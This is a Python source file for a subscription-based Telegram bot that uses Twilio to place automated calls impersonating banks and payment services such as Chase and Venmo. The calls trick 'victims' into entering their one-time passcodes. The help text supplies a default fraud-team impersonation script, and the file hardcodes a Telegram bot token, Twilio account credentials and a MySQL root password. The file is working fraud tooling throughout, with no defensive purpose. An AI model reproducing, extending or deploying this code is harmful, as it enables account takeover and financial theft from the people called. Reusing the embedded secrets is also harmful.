from ast import While
import hmac
import subprocess
import aiohttp
from xml.dom.minidom import Document
from fake_useragent import UserAgent
import logging
import os
from h11 import Data
from numpy import append
import requests
import time
import string
import random
from sympy import fu
import yaml
import asyncio
import re
from fp.fp import FreeProxy
import json
from bs4 import BeautifulSoup as bs, ResultSet
from flask_mysqldb import MySQL
import httpx
import argparse
import sys
from random import randrange as r
import time
from datetime import date
import concurrent.futures
import twilio
from twilio.twiml.voice_response import Gather, VoiceResponse
import os
from twilio.rest import Client
from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather
from flask import (flash,render_template,redirect,request,session,url_for,)
from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
import aiogram.utils.markdown as md
import MySQLdb

# session = aiohttp.ClientSession()
app = Flask(__name__)
# BOT CONFIG
TOKEN = '5421535686:AAHYdLH0TAjZf1x47JU0QZ_vO5NHSrno7Gs'
PREFIX = '/!.'
OWNER = '5080127325 '
ANTISPAM = '10'
today = date.today()
d4 = today.strftime("%b-%d-%Y")
bankname = ''
# INITIATE BOT
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)
# Configure logging
logging.basicConfig(level=logging.INFO)
# BOT INFO
loop = asyncio.get_event_loop()
# GET BOT INFO
bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id
print('Working...')
# REQUEST HEADERS 
headers = {'User-Agent': 'Mozilla/5.0'}
session = requests.Session()
# TWILIO WEBHOOKS
userurl = 'http://127.0.0.1:5000/users'
callurl = 'http://127.0.0.1:5000/voice'
custom = 'http://127.0.0.1:5000/custom'
cust1 = 'http://127.0.0.1:5000/custom1'
addurl = 'http://127.0.0.1:5000/add'
verifyurl = 'http://127.0.0.1:5000/verify'

ring = '🔔 Ringing'
# NGROK LINK 
ngrok = 'https://xynznzx.ngrok.io/'

# MYSQL INFO
mysql_host = 'localhost'
mysql_user = 'root'
mysql_password = '2020Blkout6080!'
mysql_db = 'Users'
# config db
db = MySQLdb.connect(host=mysql_host,user=mysql_user,passwd=mysql_password,db=mysql_db)
cur = db.cursor()
cur.execute("SELECT * FROM subs")
u = cur.fetchall()
print(u)
# ADD USERS CHAT TO USE BOT
mysql = MySQL()
verified = []
acl = ()
admins = 5080127325

# USER RESET LIST
with open('saved.txt', 'r') as f:
    saved = f.readlines()
    for row in saved:
        slp = row.split('\n')[0]
        verified.append(int(slp))
        print(slp)

users = lambda message: message.from_user.id not in verified
# TWILIO ACCOUNT SID
account_sid = 'AC4887f66b6869ead70dcb061b448a2801'
# TWILIO ACCOUNT TOKEN
auth_token = '7c08527e562e7ae09490be31274d2715'
# TWILIO US NUMBERS
num = '+19786788488','+19496965610','+18155221591','+18775664035','+19786788488'
# CA NUMBERS
canum = '+15818905462','+13656456520'
# START TELE
client = Client(account_sid, auth_token)
# START COMMAND

@dp.message_handler(commands=['start'], commands_prefix=PREFIX)
async def start(message: types.Message):
    await message.answer_chat_action('typing')
    usrid = message.chat.id
    FIRST = message.from_user.first_name
    MSG = f'''
Welcome {FIRST} 🙍‍♂️, Im {BOT_NAME}

<code>How To Use Me:</code>
📞(/help) ~ Learn How To Use Bot
🩸(/activate) ~ Activate Your Licence Key

<b>COMMANDS:</b>
☎️(/otp) ~ US OTP
📟(/bank) ~ UD Bank OTP 
📝(/custom) ~ US Custom OTP
📲(/pgp) ~ PGP Mode *COMING SOON*

<b>CANADA 🇨🇦</b>
🇨🇦(/ca) ~ Canada OTP
🇨🇦(/custca) ~ Custom Canada OTP

YOUR CHATID ~ {usrid}
You can find my Boss @xynznzx '''
    await message.answer(MSG, disable_web_page_preview=True)
    mycursor = mysql.connection.cursor()
    mycursor.execute('SELECT %s FROM subs WHERE username=%s', (message.chat.id,))
    data = mycursor.fetchone()
    for chatid in data:
        print(chatid)
    temp = data['chatid']
    print('Username does not exist')
# HELP COMMAND
@dp.message_handler(commands=['help'], commands_prefix=PREFIX)
async def help(message: types.Message):
    await message.answer_chat_action('typing')
    msg = (f'''
HOW TO USE ACEOTPBOT:

/otp :
STEP 1 ~ ENTER VICTIMS PHONE NUMBER WITH THE + SIGN AND COUNTRY CODE (ex: +16138430596)
STEP 2 ~ ENTER SERVICE YOU NEED OTP FOR (ex: Venmo)
STEP 3 ~ ENTER HOW OTP CODE LENGTH (ex: 6)
STEP 4 ~ IF INFO CORRECT TYPE Y OR N

/bank :
STEP 1 ~ ENTER VICTIMS PHONE NUMBER WITH THE + SIGN AND COUNTRY CODE (ex: +16138430596)
STEP 2 ~ ENTER SERVICE YOU NEED OTP FOR (ex: Venmo)
STEP 3 ~ ENTER HOW OTP CODE LENGTH (ex: 6)
STEP 4 ~ IF INFO CORRECT TYPE Y OR N

/custom :

MAKE SURE YOUR SPELLING AND PUNCTUATION ARE CORRECT!!! 

STEP 1 ~ ENTER FIRST MESSAGE - THIS WILL BE THE MESSAGE YOUR VICTIM HEARS AFTER THEY FIRST ANSWER THE PHONE * MAKE SURE YOUR CODE OPTION IS 'PRESS 2' TO CONTINUE WITH SCRIPT

DEFUALT SCIPT ex :

This is Chase's fraud prevention team.
We are calling you because there has been a password reset attempt on your account.
If this was you , please press 1.
If this was not you , please press 2.

STEP 2 ~ ENTER SECOND MESSAGE = THIS WILL BE THE MESSAGE YOUR VICTIM HEARS AFTER PRESSING 2 

DEFAULT SCRIPT ex :

We take security seriously.
To secure your account we has sent you a 6 digit security code to the phone number listed on the account.
Please enter the six digit code.

STEP 3 ~ ENTER FINAL MESSAGE - THIS WILL BE THE MESSAGE YOUR VICTIM HEARS AFTER ENTERING CODE

You are all set.
Thank you for securing youre account. 
Goodbye.

STEP 4 ~ ENTER VICTIMS PHONE NUMBER WITH THE + SIGN AND COUNTRY CODE (ex: +16138430596)
STEP 5 ~ ENTER SERVICE YOU NEED OTP FOR (ex: Venmo)
STEP 6 ~ ENTER HOW OTP CODE LENGTH (ex: 6)
STEP 7 ~ IF INFO CORRECT TYPE Y OR N''')
    await message.answer(msg, disable_web_page_preview=True)
# CANCEL COMMAND
@dp.message_handler(state='*', commands=['cancel'], commands_prefix=PREFIX)
async def cancel_handler(message: types.Message, state: FSMContext):
    """Allow user to cancel action via /cancel command"""
    current_state = await state.get_state()
    if current_state is None:
        # User is not in any state, ignoring
        return

    # Cancel state and inform user about it
    await state.finish()
    await message.reply('Cancelled.')
# AUTHORIZED USERS

@dp.message_handler(users, content_types=['any'])
async def check_unwanted_users(message: types.Message):
    id = message.chat.id
    name = message.chat.username
    if id in verified:
        print('Alr Here')
    else:
        db = MySQLdb.connect(host=mysql_host,user=mysql_user,passwd=mysql_password,db=mysql_db)
        cur = db.cursor()
        cur.execute("SELECT %s FROM subs WHERE chatid= %s", (id,id,))
        res = cur.fetchall()
        for row in res:
            pos = row[0]
            if row == None:
                print('No User')
            if pos == message.chat.id:
                verified.append(pos)
                print(verified)
                f.write(int(pos))
            else:
                await message.answer('You Do Not Have Permission To Use This Bot!')
                return
    return
@dp.message_handler(users, content_types=['any'])
async def handle_unwanted_users(message: types.Message):
    await message.answer('You Do Not Have Permission To Use This Bot!')
    return

async def is_owner(user_id):
    status = False
    if user_id == OWNER:
        status = True
    return status

#  ADD USERS TO DB
class ADD(StatesGroup):
    chatid = State()
    username = State()
    sub = State()
    added = State()
    bank = State()
@dp.message_handler(state='*', commands=['add'], commands_prefix=PREFIX)
async def add(message: types.Message, state: FSMContext):
    member = message.chat.id
    if member == admins:
        await message.answer_chat_action('typing')
        await ADD.chatid.set()
        await message.answer('Enter Users Chat ID:')
    else:
        await message.answer('You Need To Be Admin For This')
@dp.message_handler(state=ADD.chatid)
async def chatid(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as adata:
        adata['chatid'] = message.text
    await ADD.next()
    await message.answer(f'''Enter Username: ''')
@dp.message_handler(state=ADD.username)
async def username(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as adata:
        adata['username'] = message.text

    await ADD.next()
    await message.answer(f'''Enter SUB: ''')
@dp.message_handler(state=ADD.sub)
async def sub(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as adata:
        adata['sub'] = message.text

    await ADD.next()
    await message.answer(f'''Enter Date Added: ''')
@dp.message_handler(state=ADD.added)
async def added(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as adata:
        adata['added'] = message.text
    await ADD.next()
    await message.answer(f'''Bank: ''')
@dp.message_handler(state=ADD.bank)
async def bank(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as adata:
        adata['bank'] = message.text

        chatid = adata['chatid']
        username = adata['username']
        sub = adata['sub']
        added = adata['added']
        bank = adata['bank']
        
        payload = {'chatid' : chatid ,'username': username , 'sub': sub, 'added': added}
        payload2 = {'chatid' : chatid, 'bank': bank, 'codelen': bank}
        payload3 = {'chatid' : chatid ,'bank': bank , 'first': added, 'second': sub, 'final': username, 'codelen': bank}
        
        r = session.post(userurl,headers=headers,data=payload)
        r2 = session.post(verifyurl,headers=headers,data=payload2)
        r3 = session.post(cust1,headers=headers,data=payload3)
        output = r.text
        addmsg = (f'''
{username} ~ ({chatid}) : Added To DB
({sub}) Day Subscription
ADDED ON ~ {added}
{bank} ''')
        if output == 'success':
            await message.answer(addmsg)
        else:
            await message.answer('Unable to add to db')

    await state.finish()

# SERVICE OTP
class OTP(StatesGroup):
    phone = State()
    name = State()
    len = State()
    val = State()
@dp.message_handler(commands=['otp'], commands_prefix=PREFIX)
async def otp(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    await OTP.phone.set()
    await message.answer(f'''📞 Enter Victim's Phone Number with (+): ''')
@dp.message_handler(state=OTP.phone)
async def phone(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        data['phone'] = message.text

    await OTP.next()
    await message.answer(f'''
🏦 Enter OTP Service Needed:
(Venmo , Cashapp , Coinbase , ETC..) ''')
@dp.message_handler(state=OTP.name)
async def name(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        data['name'] = message.text
        servname = message.text
        print(servname)

    await OTP.next()
    await message.answer(f'''
📟 Enter OTP Length: (EX: 6)''')
@dp.message_handler(state=OTP.len)
async def len(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        data['len'] = message.text
        phone = data['phone']
        name = data['name']
        len = data['len']

    msg = (f'''
📞 Victim ~ {phone}
🏦 Service ~ {name}
📟 Code Length ~ {len}
IS THE INFORMATION CORRECT ? (Y/N)''')
    await OTP.next()
    await message.answer(msg)
@dp.message_handler(state=OTP.val)
async def val(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        USERID = message.chat.id
        data['val'] = message.text
        val = data['val'] 
        phone = data['phone']
        name = data['name']
        flen = data['len']
        us = random.choice(num)
        if val.lower() == 'y':
            text = (f'''
📲 Calling {phone} as {name} from {us}
You can /cancel at anytime''')
            payload = {'chatid' : USERID ,'bank': name, 'codelen': flen}
            r = session.post(addurl,headers=headers,data=payload)
            output = r.text
            await message.answer(text)
            call = client.calls.create(
                        url= ngrok+'service',
                        to= phone,
                        from_= us
                    )
            await state.finish()
            await message.answer(ring)

        if val == 'n':
            await message.answer('Press /cancel & Please Try Again')
            await state.finish()


# BANK OTP
class Bank(StatesGroup):
    phone = State()
    name = State()
    len = State()
    val = State()
@dp.message_handler(commands=['bank'], commands_prefix=PREFIX)
async def bank(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')

    await Bank.phone.set()
    await message.answer(f'''📞 Enter Victim's Phone Number with (+): ''')
@dp.message_handler(state=Bank.phone)
async def bphone(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    global bdata
    async with state.proxy() as bdata:
        bdata['phone'] = message.text

    await Bank.next()
    await message.answer(f'''
🏦 Enter OTP Bank Service Needed:
(Chase , Wells Fargo , Bank Of America , ETC..) ''')
@dp.message_handler(state=Bank.name)
async def bname(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as bdata:
        bdata['name'] = message.text
        global bankname
        bankname = message.text

    await Bank.next()
    await message.answer(f'''
📟 Enter OTP Length: (EX: 6)''')
@dp.message_handler(state=Bank.len)
async def blen(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as bdata:
        bdata['len'] = message.text
    
    phone = bdata['phone']
    name = bdata['name']
    len = bdata['len']

    msg = (f'''
📞 Victim ~ {phone}
🏦 Bank ~ {name}
📟 Code Length ~ {len}
IS THE INFORMATION CORRECT ? (Y/N)''')
    await Bank.next()
    await message.answer(msg)
@dp.message_handler(state=Bank.val)
async def bval(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as bdata:
        USERID = message.chat.id
        bdata['val'] = message.text
        val = bdata['val'] 
        phone = bdata['phone']
        global bbname
        bbname = bdata['name']
        blenn = bdata['len']
        us = random.choice(num)
        if val.lower() == 'y':
            text = (f'''
📲 Calling {phone} as {bbname} from {us}
You can /cancel at anytime''')

            payload = {'chatid' : USERID ,'bank': bbname, 'codelen': blenn}
            r = session.post(addurl,headers=headers,data=payload)
            output = r.text
            await message.answer(text)
            call = client.calls.create(
                        url= ngrok+'voice',
                        to= phone,
                        from_= us
                    )
            await state.finish()
            await message.answer(ring)
            
            # session.close()                   
            # answer = call.answered_by()    
        if val == 'n':
            await message.answer('Press /cancel & Please Try Again')
            await state.finish()
    
# CUSTOM OTP
class cust(StatesGroup):
    firstscript = State()
    secondscript = State()
    finalscript = State()
    phone = State()
    name = State()
    len = State()
    val = State()
@dp.message_handler(commands=['custom'], commands_prefix=PREFIX)
async def fscript(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')

    await cust.firstscript.set()
    await message.answer(f'''📞 ENTTER ANSWER MESSAGE: ''')
@dp.message_handler(state=cust.firstscript)
async def sscript(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    global cdata
    async with state.proxy() as cdata:
        cdata['firstscript'] = message.text

    await cust.next()
    await message.answer(f''' EENTER MAIN MESSAGE: ''')
@dp.message_handler(state=cust.secondscript)
async def dscript(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    global cdata
    async with state.proxy() as cdata:
        cdata['secondscript'] = message.text

    await cust.next()
    await message.answer(f''' ENTER FINAL MESSAGE: ''')
@dp.message_handler(state=cust.finalscript)
async def bank(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['finalscript'] = message.text

    await cust.next()
    await message.answer(f'''📞 Enter Victim's Phone Number with (+): ''')
@dp.message_handler(state=cust.phone)
async def phone(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['phone'] = message.text

    await cust.next()
    await message.answer(f'''Enter Service You're Calling From: (ex: T-Mobile)''')
@dp.message_handler(state=cust.name)
async def cname(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['name'] = message.text
        global bankname
        bankname = message.text
    await cust.next()
    await message.answer(f'''
📟 Enter OTP Length: (EX: 6)''')
@dp.message_handler(state=cust.len)
async def clen(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['len'] = message.text
        first = cdata['firstscript']
        second = cdata['secondscript']
        final = cdata['finalscript']
        phone = cdata['phone']
        name = cdata['name']
        len = cdata['len']
        msg = (f'''
ON PICK UP ~ {first}
ON 2 PRESS ~ {second}
GOODBYE MESSAGE ~ {final}


📞 Victim ~ {phone}
🏦 Bank ~ {name}
📟 Code Length ~ {len}

IS THE INFORMATION CORRECT ? (Y/N)''')
    await cust.next()
    await message.answer(msg)
@dp.message_handler(state=cust.val)
async def cval(message: types.Message, state: FSMContext):
    async with state.proxy() as cdata:
        cdata['val'] = message.text

        
        chatid = message.chat.id
        first = cdata['firstscript']
        second = cdata['secondscript']
        final = cdata['finalscript']
        val = cdata['val'] 
        phone = cdata['phone']
        cbname = cdata['name']
        clen = cdata['len']
        us = random.choice(num)
        if val.lower() == 'y':
            text = (f'''
📲 Calling {phone} as {cbname} from {us}
You can /cancel at anytime''')

            payload = {'chatid' : chatid ,'bank': cbname , 'first': first, 'second': second, 'final': final, 'codelen': clen}
            r = session.post(custom,headers=headers,data=payload)
            # output = r.text
            await message.answer(text)
            call = client.calls.create(
                        url= ngrok+'customs',
                        to= phone,
                        from_= us
                    )
            await state.finish()
            await message.answer(ring)
            
            # session.close()                   
            # answer = call.answered_by()    
        if val == 'n':
            await message.answer('Press /cancel & Please Try Again')
            await state.finish()
    
class CAOTP(StatesGroup):
    phone = State()
    name = State()
    len = State()
    val = State()
@dp.message_handler(commands=['ca'], commands_prefix=PREFIX)
async def caotp(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    await CAOTP.phone.set()
    await message.answer(f'''📞 Enter Victim's Phone Number with (+): ''')
@dp.message_handler(state=CAOTP.phone)
async def caphone(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        data['phone'] = message.text

    await CAOTP.next()
    await message.answer(f'''
🏦 Enter OTP Service Needed:
(Venmo , Cashapp , Coinbase , ETC..) ''')
@dp.message_handler(state=CAOTP.name)
async def caname(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        data['name'] = message.text
        servname = message.text
        print(servname)

    await CAOTP.next()
    await message.answer(f'''
📟 Enter OTP Length: (EX: 6)''')
@dp.message_handler(state=CAOTP.len)
async def calen(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        data['len'] = message.text
        phone = data['phone']
        name = data['name']
        len = data['len']

    msg = (f'''
📞 Victim ~ {phone}
🏦 Service ~ {name}
📟 Code Length ~ {len}
IS THE INFORMATION CORRECT ? (Y/N)''')
    await CAOTP.next()
    await message.answer(msg)
@dp.message_handler(state=CAOTP.val)
async def caval(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as data:
        USERID = message.chat.id
        data['val'] = message.text
        val = data['val'] 
        phone = data['phone']
        name = data['name']
        flen = data['len']
        ca = random.choice(canum)
        if val.lower() == 'y':
            text = (f'''
📲 Calling {phone} as {name} from {ca}
You can /cancel at anytime''')
            payload = {'chatid' : USERID ,'bank': name, 'codelen': flen}
            r = session.post(addurl,headers=headers,data=payload)
            output = r.text
            await message.answer(text)
            call = client.calls.create(
                        url= ngrok+'service',
                        to= phone,
                        from_=ca
                    )
            await state.finish()
            await message.answer(ring)
        if val == 'n':
            await message.answer('Press /cancel & Please Try Again')
            await state.finish()


# CUSTOM OTP
class ccust(StatesGroup):
    firstscript = State()
    secondscript = State()
    finalscript = State()
    phone = State()
    name = State()
    len = State()
    val = State()
@dp.message_handler(commands=['custca'], commands_prefix=PREFIX)
async def cfscript(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')

    await ccust.firstscript.set()
    await message.answer(f'''📞 ENTTER ANSWER MESSAGE: ''')
@dp.message_handler(state=ccust.firstscript)
async def csscript(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    global cdata
    async with state.proxy() as cdata:
        cdata['firstscript'] = message.text

    await ccust.next()
    await message.answer(f''' EENTER MAIN MESSAGE: ''')
@dp.message_handler(state=ccust.secondscript)
async def cdscript(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    global cdata
    async with state.proxy() as cdata:
        cdata['secondscript'] = message.text

    await ccust.next()
    await message.answer(f''' ENTER FINAL MESSAGE: ''')
@dp.message_handler(state=ccust.finalscript)
async def cbank(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['finalscript'] = message.text

    await ccust.next()
    await message.answer(f'''📞 Enter Victim's Phone Number with (+): ''')
@dp.message_handler(state=ccust.phone)
async def cphone(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['phone'] = message.text

    await ccust.next()
    await message.answer(f'''Enter Service You're Calling From: (ex: T-Mobile)''')
@dp.message_handler(state=ccust.name)
async def ccname(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['name'] = message.text
        global bankname
        bankname = message.text
    await ccust.next()
    await message.answer(f'''
📟 Enter OTP Length: (EX: 6)''')
@dp.message_handler(state=ccust.len)
async def cclen(message: types.Message, state: FSMContext):
    await message.answer_chat_action('typing')
    async with state.proxy() as cdata:
        cdata['len'] = message.text
        first = cdata['firstscript']
        second = cdata['secondscript']
        final = cdata['finalscript']
        phone = cdata['phone']
        name = cdata['name']
        len = cdata['len']
        msg = (f'''
ON PICK UP ~ {first}
ON 2 PRESS ~ {second}
GOODBYE MESSAGE ~ {final}


📞 Victim ~ {phone}
🏦 Bank ~ {name}
📟 Code Length ~ {len}

IS THE INFORMATION CORRECT ? (Y/N)''')
    await ccust.next()
    await message.answer(msg)
@dp.message_handler(state=ccust.val)
async def ccval(message: types.Message, state: FSMContext):
    async with state.proxy() as cdata:
        cdata['val'] = message.text

        
        chatid = message.chat.id
        first = cdata['firstscript']
        second = cdata['secondscript']
        final = cdata['finalscript']
        val = cdata['val'] 
        phone = cdata['phone']
        cbname = cdata['name']
        clen = cdata['len']
        ca = random.choice(num)
        if val.lower() == 'y':
            text = (f'''
📲 Calling {phone} as {cbname} from {ca}
You can /cancel at anytime''')

            payload = {'chatid' : chatid ,'bank': cbname , 'first': first, 'second': second, 'final': final, 'codelen': clen}
            r = session.post(custom,headers=headers,data=payload)
            # output = r.text
            await message.answer(text)
            call = client.calls.create(
                        url= ngrok+'customs',
                        to= phone,
                        from_= ca
                    )
            await state.finish()
            await message.answer(ring)
            
            # session.close()                   
            # answer = call.answered_by()    
        if val == 'n':
            await message.answer('Press /cancel & Please Try Again')
            await state.finish()




if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop),
